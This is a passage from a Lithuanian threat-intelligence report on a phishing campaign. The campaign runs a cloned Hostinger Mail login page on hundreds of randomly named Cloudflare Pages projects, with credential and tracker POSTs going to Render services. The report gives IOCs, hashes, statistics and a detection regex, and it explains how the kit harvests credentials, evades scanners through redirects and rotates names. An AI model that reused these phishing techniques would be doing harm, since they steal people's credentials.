| 2026-07-20 | Ankstyviausias grąžintas latest document hash match | Naujausia dokumento versija, tačiau paieška buvo truncated |
| 2026-08-18 iki 2026-08-23 | Vietiniame subset 30 skenų ir 25 hostai | Discovery langas, ne kampanijos pradžia |
| 2026-08-24 | Penki iš aštuonių hostų pateikė exact dokumentą ir script'us; du rodė Cloudflare warning, vienas 522 | Dalinis enforcement ir dalinis tolesnis prieinamumas ribotame sample |
| 2026-08-24 17:48-17:53 | Penki exact-root hostai patikrinti penkiais fiksuotais ZIP basename'ais | 25 HTML response, nulis valid ZIP; siauras negative result |

Core hash pradžia 2025 m. gruodį ir ilgo hostname prefix'o pradžia 2026 m. kovą rodo kit'o tęstinumą per infrastruktūros naming pokytį. Tai nėra įrodymas, kad per visą laikotarpį veikė tas pats žmogus.

## Ne klasikinis DGA, o automatizuotas Pages project-name generatorius

Exact task-hostname paieška grąžino 298 unikalius ilgo family vardus. Per kitus vietinius pivot'us rastas dar vienas to paties šablono vardas, kuris URLScan įraše buvo final page už <code>rb.gy</code>, o ne task domain. Todėl skaičiai turi dvi aiškias ribas: **298 exact task-query vardai ir 299 vardų pilnas vietinis cross-pivot union**.

Visi 299 turėjo vienodą struktūrą:

~~~text
hostinger-mail-ewgjnwrkgnkrw-<24 mažosios a-z raidės>.pages.dev
~~~

Pagrindiniame 298 task-hostname rinkinyje per 7 152 suffix pozicijas:

- visi suffix'ai buvo tiksliai 24 simbolių;
- naudotos visos 26 lotyniškos mažosios raidės;
- vienos raidės dažnis svyravo nuo 249 iki 303;
- išmatuota Shannon entropija buvo apie 4,6987 bitų simboliui;
- teorinis maksimumas 26 raidžių abėcėlei yra apie 4,7004;
- bendras chi-square prieš vienodą 26 raidžių pasiskirstymą buvo 17,27 su 25 laisvės laipsniais;
- visi 298 suffix'ai buvo unikalūs.

Pilname 299 vardų union entropija liko 4,6986, o chi-square 18,41. Gretimos raidės sutapo 3,55 proc. atvejų, kai uniform model tikėtųsi 3,85 proc. Pagal first-seen laiką išrikiuotų gretimų suffix'ų vidutinis Hamming distance buvo 23,044 iš 24, o uniform model tikėtųsi 23,077. First-seen laiko ir base-26 suffix reikšmės Pearson koreliacija buvo tik 0,110. Tai nėra formalus kriptografinio RNG testas, bet duomenyse nematyti paprasto counter'io, datos ar nuosekliai kintančio template.

24 raidžių lowercase namespace yra <code>26^24</code>, maždaug <code>9,11 × 10^33</code> variantų arba 112,81 bitų, jeigu simboliai renkami nepriklausomai. Tikėtina collision tikimybė 299 vardų mastu būtų apie <code>4,89 × 10^-30</code>. Kitaip tariant, collision čia būtų gerokai įdomesnis finding'as nei dar vienas <code>final-final2</code> projektas.

Tai labai stipriai dera su automatizuotu vienodo formato vardų generavimu. Žmogus gali ranka parašyti <code>qwerty</code>, <code>test2</code> ir <code>final-final-really-final</code>. Žmogus rečiau ranka pagamina 299 beveik idealiai vienodus 24 raidžių suffix'us. Čia automatizacijos kvapas jaučiasi net be AI, blockchain ir kito presentation layer rūko.

Vis dėlto žodis **DGA** čia būtų per platus. Klasikinis malware DGA generuoja registruojamus domenus ar destination kandidatų seką, kurią klientas vėliau bando resolve'inti. Čia registruojamas domenas <code>pages.dev</code> nekinta. Keičiasi operatoriaus pasirinktas Cloudflare Pages projekto label. Nerastas joks client-side kodas, kuris pagal datą, seed'ą ar counter'į skaičiuotų būsimus vardus. Tikslesni terminai yra **automated project-name randomization** arba **deployment-name generator**.

Konceptualiai tokį output galėtų sukurti labai paprasta funkcija:

~~~python
suffix = "".join(choice("abcdefghijklmnopqrstuvwxyz") for _ in range(24))
~~~

Tai yra iliustracija, ne iš operatoriaus gautas source code. Vien iš output neįmanoma pasakyti, ar naudotas Python <code>random</code>, <code>secrets</code>, JavaScript <code>Math.random</code>, custom base-26 encoding, seeded PRNG ar iš anksto sugeneruotas sąrašas. Taip pat negalima atkurti seed'o, prognozuoti kito vardo ar priskirti generatoriaus konkrečiam account'ui.

Fiksuotas <code>ewgjnwrkgnkrw</code> segmentas visuose 299 varduose nesikeičia ir vietiniame rinkinyje neturi kitos brand'o temos. Todėl evidence leidžia jį laikyti tik stabiliu šio stebėto rinkinio deployment-batch token'u, bet ne actor ID ar platesnės family marker'iu. Vieną kartą sugeneruotas ir template paliktas string'as dar nėra žmogaus piršto atspaudas.

Sanitizuota machine-readable analizė ir metodikos aprašas įtraukti į [viešą tyrimo artefaktų rinkinį](/assets/data/hostinger-pages-phishing-2026/README.md). Esminė logika sąmoningai nuobodi:

~~~python
HOST_RE = re.compile(
    r"^hostinger-mail-ewgjnwrkgnkrw-(?P<suffix>[a-z]{24})\.pages\.dev$"
)
suffixes = {HOST_RE.fullmatch(host).group("suffix") for host in hostnames}
counts = Counter("".join(suffixes))
entropy = -sum((n / sum(counts.values())) * math.log2(n / sum(counts.values())) for n in counts.values())
~~~

Svarbi Cloudflare Pages detalė: oficialioje dokumentacijoje production adresas yra <code>&lt;PROJECT_NAME&gt;.pages.dev</code>, o preview deployment turi papildomą label, pvz. <code>&lt;hash&gt;.&lt;project&gt;.pages.dev</code>. Stebėti vardai yra vieno lygio po <code>pages.dev</code>.

Geriausiai duomenis paaiškinanti inference yra daug atskirai pavadintų Pages projektų, o ne šimtai vieno projekto preview. Tik Cloudflare vidiniai duomenys gali patvirtinti, ar tie projektai siejasi tuo pačiu account'u, repository, Direct Upload token'u, mokėjimo priemone ar source IP.

## 562 stebėjimų istorinis vaizdas

Ilgo hostname family URLScan rinkinys:

| Mėnuo UTC | Scan stebėjimai | Pirmą kartą rinkinyje matyti hostname'ai |
| --- | ---: | ---: |
| 2026-03 | 2 | 2 |
| 2026-04 | 116 | 85 |
| 2026-05 | 115 | 72 |
| 2026-06 | 153 | 74 |
| 2026-07 | 94 | 30 |
| 2026-08 iki 23 d. | 82 | 35 |

199 hostname'ai turėjo daugiau nei vieną išsaugotą skeną. 83 buvo stebėti bent 30 dienų skirtumu. Ilgiausias tarpas tarp dviejų to paties hostname išsaugotų skenų buvo 131,94 dienos.

Tai nereiškia, kad hostas visą tarpą buvo online. Tai reiškia, kad jis buvo pateiktas ar pasiekiamas bent dviem konkrečiais momentais. URLScan nedaro automatinio nuolatinio recrawl, o submitter'io elgsena iškreipia matomą apimtį.

Galutinės navigacijos tarp 562 stebėjimų:

| Galutinis rezultatas | Stebėjimai |
| --- | ---: |
| Teisėtas <code>mail.hostinger.com</code> | 473 |
| Cloudflare suspected-phishing interstitial | 70 |
| Liko Pages hoste | 16 |
| Timeout | 3 |

Legitimus final URL nepaverčia pradinio task domeno teisėtu. Šiuo atveju redirect'as yra pačios apgaulės dalis. Jei scanner'is vertina tik kelionės pabaigą, jis pamato Hostinger. Jei vertina, kas įvyko prieš pabaigą, pamato credential formą ir svetimą POST destination.

Visuose 30 vietinio subset skenų URLScan automatinis overall malicious verdict buvo false, nors 23 submitter'io žymos turėjo <code>possiblethreat</code> ir <code>phishing</code>. Tai neįrodo, kad URLScan "suklydo" kaip absoliuti sistema. Tai parodo, kodėl verdict'as negali pakeisti response body analizės.

## Dabartinės būsenos patikrinimas 2026-08-24

Aštuonių deterministinių hostų root rezultatai:

| Klasifikacija | Hostai | Reikšmė |
| --- | ---: | --- |
| Exact žinomas kenksmingas dokumentas | 5 | Body SHA-256 sutapo su dekoduotu credential-harvester dokumentu |
| Cloudflare "Suspected Phishing" interstitial | 2 | Platforma tuo momentu rodė apsauginį warning |
| Cloudflare 522 | 1 | Tuo momentu grąžintas connection timeout, turinio būsena nenustatyta |

Penki exact-match hostai po to pateikė po tris žinomus script'us. Visi 15 response sutapo su archyvuotais hash'ais:

| Path | Rolė | SHA-256 | Exact matches |
| --- | --- | --- | ---: |
| <code>/js.js</code> | credentials, fake errors ir redirect | <code>9805613d...b311c2</code> | 5 iš 5 |
| <code>/js1.js</code> | current tracker | <code>563824f1...ee6d5d</code> | 5 iš 5 |
| <code>/jg.js</code> | generic anti-inspection | <code>9201f2ee...7d503</code> | 5 iš 5 |

Tai aukšto confidence dabartinės būsenos patvirtinimas tiems penkiems hostams tuo konkrečiu metu. Tai nėra teiginys, kad 5/8 proporcija galiojo visiems 298 hostams.

### Kodėl root nukreipė, o unknown path paliko kloną ekrane

Per atskirą manual patikrinimą isolated VM aplinkoje bare project URL iškart navigavo atgal į teisėtą Hostinger Mail. Pridėjus <code>/admin</code>, nukopijuota sąsaja liko ekrane. Per tą pačią browser sesiją buvo bandyti ir keli kiti spėjami path'ai, bet atskirų URL bei network trace neišsaugojau. Todėl du įvardytus path'us laikau analyst observation, ne išmatuotu path dataset.

Kad nereikėtų po fakto iš atminties gaminti labai patogios browser history, atlikau dar vieną fixed-path patikrinimą viename hoste, kuris pirmiausia turėjo pateikti tikslų žinomo root SHA-256. Dešimt path'ų buvo fiksuoti iš anksto, request'ai vykdyti po vieną, su išjungtais redirect'ais ir be JavaScript renderinimo:

| Patikrinti path'ai | HTTP rezultatas | Body rezultatas |
| --- | --- | --- |
| <code>/admin</code>, <code>/admin/</code>, <code>/login</code>, <code>/webmail</code>, <code>/auth</code>, <code>/mail</code>, <code>/robots.txt</code>, <code>/favicon.ico</code>, <code>/hecavex-path-control-20260824</code> | 200 <code>text/html</code> | 186 751 baitas; visuose devyniuose tikslus žinomas root SHA-256 |
| <code>/index.html</code> | 308 į <code>/</code> | Tuščias body; redirect'as nesektas |

Tai buvo **response comparison, ne active form interaction**: 11 GET kartu su root gate, dviejų sekundžių pauzė, jokių query parametrų, cookie, POST, recursion, bendro wordlist'o ar request į Render servisus. Rezultatas įrodo, kad Pages deployment'as unknown path'ams grąžino root dokumentą. Jis neatkuria to, ką konkrečiai vykdė vienas browser'is.

Labiausiai pagrįstas paaiškinimas yra client-side parametrų gating ir SPA fallback kombinacija:

1. **Bare root redirect, high confidence.** Pats root grąžino HTTP 200 be redirect header. Išsaugotas <code>js.js</code> tikisi validžių <code>coztrexx</code> bei <code>trexxcoz</code> reikšmių ir turi navigation į teisėtą Hostinger Mail, kai atkurtas mailbox neatitinka email pattern. <code>js1.js</code> turi atskirą fallback, kai nėra <code>trexxx</code>. Todėl direct root visit be campaign parametrų turi dingti iš klono taip, kaip ir buvo stebėta.
2. **Unknown path lieka, plausible, bet dar ne fully proven.** HTML krauna <code>jg.js</code>, <code>js1.js</code> ir <code>js.js</code> per relative path'us. Serveris tiek <code>/admin</code>, tiek <code>/admin/</code> grąžino tą patį HTML. Iš slash-terminated URL tie script vardai resolve'inasi po <code>/admin/</code>; SPA fallback tada gali grąžinti HTML ten, kur browser tikėjosi JavaScript. Su <code>X-Content-Type-Options: nosniff</code> toks response neturėtų būti vykdomas kaip script'as, todėl redirect logika gali net neprasidėti. Tikslus address po browser normalizavimo, console output, asset request'ai, cache state ir MIME sprendimai nebuvo išsaugoti, todėl galutinei išvadai reikia HAR.
3. **Platformos enforcement realus, bet šitos rezultatų poros nepaaiškina.** Du kiti bounded hostai pateikė Cloudflare <code>Suspected Phishing</code> interstitial, o vienas grąžino 522. Tai gali paaiškinti warning ar nepasiekiamą hostą, bet ne aiškiai exact-content kode įrašytą navigaciją į legit Hostinger.

Šiame case **nėra išsaugotų Evilginx įrodymų**. Turima implementacija yra static Pages clone su client-side POST destinations. Nefiksuotas reverse-proxy traffic, session-cookie relay, upstream Hostinger session, MFA relay ar Evilginx lure identifier. Query reikšmės įrodytos kaip mailbox personalization ir atskiras tracking token. Pavadinti jas Evilginx lure ID būtų labai patogu, tik tada evidence tektų vytis teiginį, o ne atvirkščiai. Taip pat nėra įrodymų, kad operatorius atpažino tyrėją ar specialiai blokavo VM. Pakeistas deployment, cache ar browser profile skirtumas lieka įmanomas, bet silpnesnis už elgseną, kuri jau aiškiai matoma išsaugotame kode.

### Penki ZIP vardai, penki hostai ir nulis ZIP

Po pirminio patikrinimo buvo atliktas atskiras hash-gated archive candidate run. Penki hostai pirmiausia turėjo dar kartą pateikti exact root dokumento SHA-256. Tik tada kiekviename buvo paprašyti penki iš anksto fiksuoti basename'ai: <code>kit.zip</code>, <code>hostinger.zip</code>, <code>mail.zip</code>, <code>backup.zip</code> ir <code>files.zip</code>.

| Kontrolė | Reikšmė |
| --- | --- |
| Laikas UTC | 2026-08-24 17:48:15 iki 17:53:38 |
| Hostai | 5 exact-content Pages vardai |
| Request'ai | 5 root gate ir 25 archive candidate, iš viso 30 GET |
| Concurrency | 1, su 10 sekundžių pauze |
| Redirect'ai | Išjungti |
| Candidate rezultatas | 25 kartus HTTP 200, <code>text/html</code>, 186 751 baitas, failed ZIP structure |
| Išsaugoti valid archyvai | 0 |

Tai yra **negative archive-recovery result**. Jis sako, kad tais penkiais vardais, penkiuose hostuose ir per 5 min. 23 sek. intervalą valid ZIP nebuvo gautas. Jis nesako, kad archyvo nebuvo kitu vardu, kitu metu ar kitame projekte.

Cloudflare dokumentuoja, kad Pages projektas be top-level <code>404.html</code> gali traktuoti save kaip SPA ir neatpažintus path'us aptarnauti root dokumento turiniu. Vienodas statusas, content type ir dydis labai gerai dera su tokiu fallback, ne su penkiais paslaptingais archyvais, kurie visi netyčia nusprendė būti HTML. Kadangi candidate body hash nebuvo įrašytas, šiame tekste neteigiu, kad visi 25 response buvo byte-identical. Jie buvo vienodo dydžio HTML ir nebuvo valid ZIP.

Patikrinimo ribos, rezultatų suvestinė ir manifestų hash pateikti [viešame tyrimo artefaktų rinkinyje](/assets/data/hostinger-pages-phishing-2026/README.md). Live collector komanda ir lokalios darbo aplinkos keliai sąmoningai neviešinami.

## Update-in-place: seni projektai gavo naują dokumentą

Trys iš penkių dabartinių exact-match hostų turėjo ankstesnius išsaugotus root hash'us:

| Istorinio hosto suffix | Istorinis skenas | Ankstesnis root hash | 2026-08-24 root hash | Išvada |
| --- | --- | --- | --- | --- |
| <code>rytcytajlrzfhyfzwajxbeqp</code> | 2026-05-01 | <code>b5e7a6aa...fd2d6</code> | <code>728d235b...f50af5</code> | pakeista į latest dokumentą |
| <code>flddahmxjzeyekhvpqblfdvn</code> | 2026-06-01 | <code>b5e7a6aa...fd2d6</code> | <code>728d235b...f50af5</code> | pakeista į latest dokumentą |
| <code>ucvdyqggkgehxwxmggwfxxga</code> | 2026-07-02 | <code>b5e7a6aa...fd2d6</code> | <code>728d235b...f50af5</code> | pakeista į latest dokumentą |

Tai rodo, kad workflow nėra vien "sukurti, panaudoti, pamiršti". Bent dalis esamų projektų buvo atnaujinta vietoje, o tuo pačiu metu buvo kuriami nauji randomizuoti vardai.

Gynybinei komandai tai reiškia du dalykus:

1. vieno URL takedown neišjungia deployment metodo;
2. senas žinomas hostas negali būti laikomas nekintančiu artefaktu, nes jo body gali būti pakeistas.

## DNS: 298 vardai resolve'inosi, bet tai nėra 298 aktyvūs phish'ai

Po dviejų dokumentuotų resolver retry visi 298 tikslūs žinomi Pages vardai turėjo viešus A atsakymus. Iš viso buvo 596 A atsakymai, 206 unikalūs IP ir 300 sekundžių TTL.

Stebėti adresai priklausė bendroms Cloudflare erdvėms:

| Stebėtas /24 | A atsakymų skaičius |
| --- | ---: |
| <code>172.66.44.0/24</code> | 135 |
| <code>172.66.45.0/24</code> | 20 |
| <code>172.66.46.0/24</code> | 20 |
| <code>172.66.47.0/24</code> | 135 |
| <code>188.114.96.0/24</code> | 143 |
| <code>188.114.97.0/24</code> | 143 |

Šitie IP yra Cloudflare platformos edge, ne attacker origin ir ne operatoriaus geografija. Blokuoti visą AS13335 dėl šio finding'o būtų maždaug tas pats, kaip dėl vieno blogo nuomininko užmūryti viso miesto duris. Efektinga, bet nelabai protinga.

Dar svarbiau, visi 298 vardai resolve'inosi, nors aštuonių hostų HTTP sample turėjo exact kit'ą, interstitial ir error. DNS atsakymas atsako į klausimą "ar vardui grąžinamas adresas", ne "koks turinys šiuo metu rodomas".

## TLS ir certificate transparency ribos

Visi aštuoni TLS handshake'ai baigėsi su TLS 1.3. Kiekvienas leaf sertifikatas turėjo exact projekto vardą ir wildcard po tuo projektu:

~~~text
<project>.pages.dev
*.<project>.pages.dev
~~~

Trys leaf buvo išduoti per Google Trust Services WE1, trys per Let's Encrypt YE2 ir du per Let's Encrypt YE1. CA skirtumai gerai dera su platformos valdoma issuance ir rotacija. Jie nėra operatoriaus fingerprint'as.

Exact-name CT paieška aštuoniems hostams grąžino 34 eilutes ir 30 unikalių nepasibaigusių sertifikatų. Naudotas viešas neautentifikuotas Cert Spotter endpoint'as rodo nepasibaigusius issuance, ne pilną istorinį archyvą. Todėl 30 yra dabartinio vaizdo apatinė riba, ne viso campaign lifetime sertifikatų skaičius.

Penkiuose istoriniuose sample sertifikato <code>validFrom</code> buvo maždaug 73-172 minutėmis ankstesnis už URLScan scan laiką. Tai dera su greitu projekto provision'inimu, bet submitter'is galėjo pats stebėti naujus sertifikatus. Negalima šio skirtumo paversti delivery ar pirmos aukos laiku.

## Dvi infrastruktūros funkcijos

Architektūra turi aiškiai atskirtus vaidmenis:

~~~text
personalizuotas lure URL
        |
        v
randomizuotas Cloudflare Pages projektas
        |
        +-> klonuotas Hostinger login HTML
        +-> stabilus credential harvester
        +-> tracker module
        +-> generic anti-inspection
        |
        +-> username/password POST į credential Render servisą
        +-> tracker token POST į kitą Render servisą
        |
        v
netikros klaidos ir redirect į teisėtą Hostinger Mail
~~~

Cloudflare Pages čia pateikia statinį lure ir kit'o failus. Render subdomenai kode atlieka credential collection bei tracking funkcijas. Paslaugų tiekėjai yra infrastruktūros tarpininkai, ne priskirti operatoriai.

2026-08-24 visų trijų Render vardų public DNS rodė tą pačią shared platform chain:

~~~text
gcp-us-west1-1.origin.onrender.com
gcp-us-west1-1.origin.onrender.com.cdn.cloudflare.net
216.24.57.15
216.24.57.7
~~~

Tai patvirtina, kad vardai resolve'inasi per Render ir Cloudflare shared infrastruktūrą. Tai nepatvirtina, kad konkreti app yra awake, priima POST, saugo duomenis ar tebėra to paties account kontrolėje. Tam reikėtų provider telemetry arba sąmoningo direct probing, kurio controlled collector'iai nevykdė. Vėlesniame VM observation HAR neišsaugotas, todėl automatinio tracker request'o per tą page load nei patvirtinti, nei atmesti negalima.

## Dalinis platformos enforcement

70 istorinių URLScan stebėjimų baigėsi Cloudflare suspected-phishing interstitial. Du iš aštuonių 2026-08-24 hostų taip pat pateikė tokį warning.

Tai yra realus mitigation signalas, bet ne visas takedown vaizdas:

- warning galėjo būti įjungtas tik daliai projektų;
- interstitial scan metu nepasako, kada jis atsirado;
- DNS gali toliau veikti;
- kitas projektas su tuo pačiu kit'u gali būti sukurtas po kelių minučių;
- penki to paties sample hostai vis dar pateikė exact malicious content.

Abuse procese todėl reikalingas ne vien URL sąrašas, o cluster package: hostname gramatika, script ir document hash'ai, pirmas bei paskutinis stebėjimas, Render roles ir prašymas provider'iui pivot'inti vidiniais account bei deployment duomenimis.

## Platesnė kit'o lineage

Hostinger core yra stipriausias šio cluster'io indikatorius, tačiau dalis implementation grammar matoma ir kituose lure'uose.

Išsaugotuose duomenyse kartojasi:

- <code>trexxx</code>;
- <code>trexxcoz</code>;
- <code>coztrexx</code>;
- <code>wfIUbh</code>;
- path marker <code>QOIUEWFHWYREFNFE2Pdf</code>.

Pirmame siaurame pivot'ų pakete, kuriam buvo išsaugoti detalesni URLScan rezultatai, po deduplikavimo pagal URLScan UUID:

| Parametrų kombinacija | Unikalūs išsaugoti skenai |
| --- | ---: |
| Visi keturi parametrai be ilgo path | 19 |
| Visi keturi parametrai ir ilgas path | 5 |
| Tik ilgas path | 3 |
| <code>trexxx</code> ir <code>trexxcoz</code> | 1 |

Šie 25 įrašai apima 2024 m. sausį iki 2026 m. rugpjūtį ir naudoja Cloudflare Pages task domenus. Galutinės temos apima Microsoft ar spreadsheet, Adobe ar PDF, generic secure-file ir kitus login lure'us.

Svarbi riba: nė vienas iš šių 25 įrašų nepersidengė su lokaliai išsaugotu exact Hostinger core, current tracker, legacy tracker ar ilgu Hostinger hostname pivot. Penki persidengė tik su generic anti-inspection hash.

Todėl bendri parametrai leidžia kelti shared kit convention ar builder lineage hipotezę. Jie neleidžia visų cross-brand puslapių suklijuoti į vieną campaign ir uždėti vieną gražų actor pavadinimą.

### Visi vietiniai Hostinger-labelled vardai nėra vienodo stiprumo

Per visus vietinius pivot'us Hostinger label turintys Pages vardai pasidalija į kelis evidence tier'us:

| Tier | Vardai | Ką rodo evidence |
| --- | ---: | --- |
| Confirmed main family | 299 | 298 exact task-query vardai ir vienas papildomas to paties ilgo prefix'o final-page vardas; fiksuotas <code>ewgjnwrkgnkrw</code>, 24 raidžių suffix ir Hostinger core kontekstas |
| Confirmed core precursor | 1 | <code>hostinger-uumivqkwcvvexhetvgxogfai[.]pages[.]dev</code>, exact credential-harvester hash nuo 2025-12-23, dar prieš ilgą 2026 m. kovo naming formą |
| Weak context lead | 1 | <code>hostinger-update-ngainmpncpsketwbolthzknx[.]pages[.]dev</code>, ryšys tik per generic anti-inspection hash ir Hostinger title |
| Grammar-only lead | 1 | <code>hostinger-wwckxewfyujojngbkjxdudnf[.]pages[.]dev</code>, platesnė path ir parametrų gramatika, bet ne exact Hostinger core; final title buvo <code>wtbbusiness</code> |

Tai reiškia, kad vietiniame evidence yra 301 Hostinger-labelled **task domain**. Iš jų 298 priklauso exact ilgam family; įtraukus vieną tik final-page rolėje matytą to paties šablono vardą, pilnas family union yra 299. Šių skaičių negalima sudėti į patogų "302 Hostinger campaign domains" sakinį. Du silpni lead'ai nėra patvirtinti family nariai.

Viename 2026-05-09 redirect chain taip pat matomas <code>hostingermailhrbgwnejfknewh[.]pythonanywhere[.]com</code> prieš Pages Hostinger puslapį. Tai delivery ar redirect infrastruktūros kontekstas, ne dar vienas Pages project-name generatoriaus output.

[Pilname defanged domenų IOC rinkinyje](/assets/data/hostinger-pages-phishing-2026/hostinger-domain-inventory.csv) viešai pateikti visi 302 Hostinger-labelled Pages vardai per task ir final-page roles bei vienas PythonAnywhere redirect-context vardas. Kiekviena eilutė išlaiko savo rolę ir evidence tier, todėl du lead'ai tyliai nepaverčiami patvirtinta campaign infrastruktūra. Pilni URL, path'ai, query string'ai ir privatūs scan identifikatoriai neįtraukti.

### 67 cross-brand task domenai su ta pačia 24 raidžių forma

Dalinio platesnės gramatikos rinkinio 99 išsaugotuose Search API response failuose buvo 366 deduplikuoti scan ID. Iš jų 67 unikalūs Pages **task domenai** atitiko bendresnę formą:

~~~text
<lure prefix>-<24 mažosios a-z raidės>.pages.dev
~~~

| Prefix | Unikalūs task domenai |
| --- | ---: |
| <code>update</code> | 19 |
| <code>adobe</code> | 11 |
| <code>excel</code> | 10 |
| <code>kdsieghrehbgherk</code> | 6 |
| <code>navieghrehbgherk</code> | 4 |
| <code>navietkoreeark</code> | 4 |
| <code>viewfile</code> | 4 |
| <code>sso-godaddy</code> | 4 |
| <code>pdf</code> | 2 |
| <code>dhl</code> | 1 |
| <code>hostinger</code> | 1 |
| <code>naver</code> | 1 |

Visi 67 suffix'ai buvo unikalūs. Jų entropija buvo 4,6892 iš 4,7004 bitų simboliui, chi-square prieš uniform pasiskirstymą buvo 24,79, nė vienas suffix nebuvo pernaudotas tarp prefix'ų ir nė vienas nesutapo su 298 pagrindinio Hostinger query suffix'ais.

Šitas shape yra rimtas signalas, kad platesnėje ekosistemoje naudojama bendra naming convention arba suderinamas builder output. Nerastas generatoriaus source code, todėl viena bendra funkcija nėra įrodyta. Rinkinys jau buvo atrinktas pagal bendrą parametrų ir path gramatiką, todėl jis nėra neutralus visų Pages projektų sample. Iš 67 negalima skaičiuoti, kokia dalis viso phishing pasaulio naudoja šį formatą. Internete jau pakanka procentų, kurių denominatorius išėjo pietauti.

### Path marker'iai keitėsi, gramatika liko

Užbaigto <code>task.url:"trexxcoz"</code> seto platesnė lineage analizė suskaičiavo 118 scan ID ir bent 15 sanitized task path variantų. Siauresnis reprodukuojamas hostname-analysis extractor'is iš jų paliko septynis vieno segmento 10-64 simbolių alphanumeric marker'ius; kitų path formų jis sąmoningai neskaičiuoja. Dažniausias <code>QOIUEWFHWYREFNFE2Pdf</code> variantas matomas 62 įrašuose nuo 2024-10-03 iki 2026-07-14. Jis kirto <code>update</code>, <code>adobe</code>, <code>excel</code>, <code>pdf</code>, <code>viewfile</code> ir vieną context-only <code>hostinger</code> prefix'ą.

Kiti variantai dera su kintančia builder gramatika, bet taip pat gali būti kelių nukopijuotų template variantų rezultatas:

| Path marker | Stebėjimai šiame sete | Temos ar hosting kontekstas |
| --- | ---: | --- |
| <code>HEDBWFRHKJEBRHJBVOLDpd</code> | 8 | ankstesni 2024 m. lure'ai |
| <code>DEWFHRGBKIFNVJDGNoffi</code> | 14 | <code>excel</code>, <code>update</code>, <code>viewfile</code> ir IPFS |
| <code>UOJFREIGTJGBRDLKFMFDyah</code> | 6 | 2024-12 iki 2025-02 |
| <code>GWEOJIGJHUWRGNJFDiddy</code> ir lowercase variantas | 4 + 1 | Uppercase forma per <code>adobe</code> ir <code>update</code>; lowercase forma per <code>dhl</code> |
| <code>peugjherkjgrgvfdchoti</code> | 2 | retesnis variantas |

Tai sustiprina reusable builder, kit convention ar service hipotezę. Šiame daliniame vietiniame rinkinyje exact Hostinger credential-harvester hash kituose brand'uose nerastas. Exact current ir legacy tracker hash rezultatai šiame rinkinyje taip pat liko Hostinger-associated. Cross-brand ryšys remiasi naming shape, path marker'iais, parametrų gramatika ir vienu plačiau pernaudotu legacy endpoint'u, o ne byte-identical Hostinger core.

## Viešas kontekstas prieš Hostinger hostname family

Viešuose šaltiniuose ta pati keturių parametrų gramatika ir ilgas path matomi anksčiau:

- išsaugotas 2025-07-24 URLScan viešas stebėjimas rodo Excel/PDF tematiką, tą patį path, parametrus ir Render request;
- išsaugotas 2025-09-16 URLScan viešas stebėjimas rodo short-link, Koyeb, Render ir Google final chain su ta pačia gramatika.

Tiesioginės šių dviejų rezultatų nuorodos nepateikiamos, nes viešoje scan metadata yra potencialiai iš gavėjų gautų reikšmių. Generic URLScan homepage nuoroda nepatvirtina nė vieno stebėjimo, todėl čia paliktos tik datos ir publikavimui saugus analitinis kontekstas.

Tai išplečia viešai patikrintą pilnos path ir parametrų gramatikos kontekstą bent iki 2025 m. liepos. Žemiau aprašytas platesnis metadata acquisition atskirai seka pavienius marker'ius ir jų persidengimus, todėl jo ankstesnės datos nėra teiginys, kad kiekviename įraše buvo visas tas pats kit'as. Vieši trečiųjų šalių verdict'ai čia naudojami kaip kontekstas, ne kaip pagrindinis finding'o įrodymas.

Viename viešame redirect-chain rezultate matomas <code>000webhostapp.com</code> hostas. Tačiau string <code>000webhostapp</code> nerastas nė viename vietiniame Hostinger body ar išvestiniame faile. Todėl negalima teigti, kad šis hostas yra dabartinio Hostinger kit'o dalis vien dėl išorinio istorinio chain.

### Dalinis platesnės lineage acquisition

Papildoma URLScan public Search API metadata paieška buvo vykdoma mėnesio intervalais nuo 2023-01-01 iki 2026-08-24. Privatus API raktas nenaudotas. Šios konkrečios public Search API metadata paieškos metu nė vienas campaign host nebuvo atidarytas. Run sustojo po išliekančio HTTP 429, užuot didinus request spaudimą.

Išsaugota būsena yra sąmoningai žymima kaip **partial**:

| Pivot | Padengimas | Unikalūs scan ID | Statusas |
| --- | --- | ---: | --- |
| Distinctive path | 44 iš 44 mėnesio intervalų | 226 | Complete šiam query ir langui |
| Task URL parametras | 44 iš 44 | 118 | Complete šiam query ir langui |
| Final page parametras | 10 iš 44, iki 2023-10-31 | 46 | Partial |
| Deployment stem | 0 iš 44 | 0 | Nepradėta |
| Legacy resource domain | 0 iš 44 | 0 | Nepradėta |

Trijų surinktų set'ų union yra 366 deduplikuoti scan ID. Distinctive-path ir task-parameter set'ai turi 23 bendrus scan ID. Tai yra stipriausias šio acquisition signalas, nes tas pats neįprastas path ir task URL gramatika sutampa konkrečiuose public scan'uose.

Skaičių tarp skirtingo padengimo pivot'ų tiesiogiai lyginti negalima. 46 partial page-parameter rezultatai nėra "mažesnė kampanija" ir 226 path rezultatai nėra aukos. Tai yra skirtingų URLScan laukų, coverage ir submitter elgsenos produktas.

Publication-safe hosting aggregate rodo matching įrašus per Cloudflare Pages, seną Replit hosting, PythonAnywhere, Koyeb, IPFS gateway, GitHub Pages ir Firebase Hosting. Šis multi-platform vaizdas sustiprina reusable framework arba builder lineage hipotezę, bet neįrodo provider kompromitavimo, vieno account ar vieno operatoriaus.

Pilnos ribos, privacy transformacija ir manifestų suvestinė pateikti [viešame tyrimo artefaktų rinkinyje](/assets/data/hostinger-pages-phishing-2026/README.md). Šis platesnis acquisition nekeičia siauresnio Hostinger finding'o evidence boundary.

## Legacy tracker endpoint: tikras ryšys, silpnas attribution

Legacy tracker endpoint matomas 58 URLScan stebėjimuose per 35 task domenus nuo 2024-01-11 iki 2026-08-02. Lure temos:

| Tema | Stebėjimai |
| --- | ---: |
| Microsoft, Excel ar spreadsheet | 19 |
| Generic secure-file ar sign-in | 15 |
| Adobe ar PDF | 12 |
| Kiti ar be title | 11 |
| Hostinger | 1 |

Task infrastruktūra apima Pages, PythonAnywhere, Koyeb, Surge ir shortener'ius.

Tai yra tikras infrastruktūros arba konvencijos reuse. Bet vienas backend vardas per kelis brand'us gali reikšti:

- vieną operatorių;
- kit'o kūrėją ir daug klientų;
- phishing-as-a-service;
- perparduotą ar nukopijuotą paketą;
- bendrą tracker servisą;
- tiesiog ilgai pernaudojamą kodą.

Vieši duomenys neleidžia patikimai pasirinkti vieno paaiškinimo. Todėl šiame tekste vartojamas "kit lineage" ir "deployment family", ne actor attribution.

## Link strength: kas stipru, kas tik kontekstas

| Lygis | Ryšys | Vertinimas |
| --- | --- | --- |
| Exact | Core SHA-256 per 467 stebėjimus | Byte-identical credential ir redirect logika, stipriausias family IOC |
| Exact | Latest document SHA-256 | Aukšto tikslumo konkrečios versijos indikatorius |
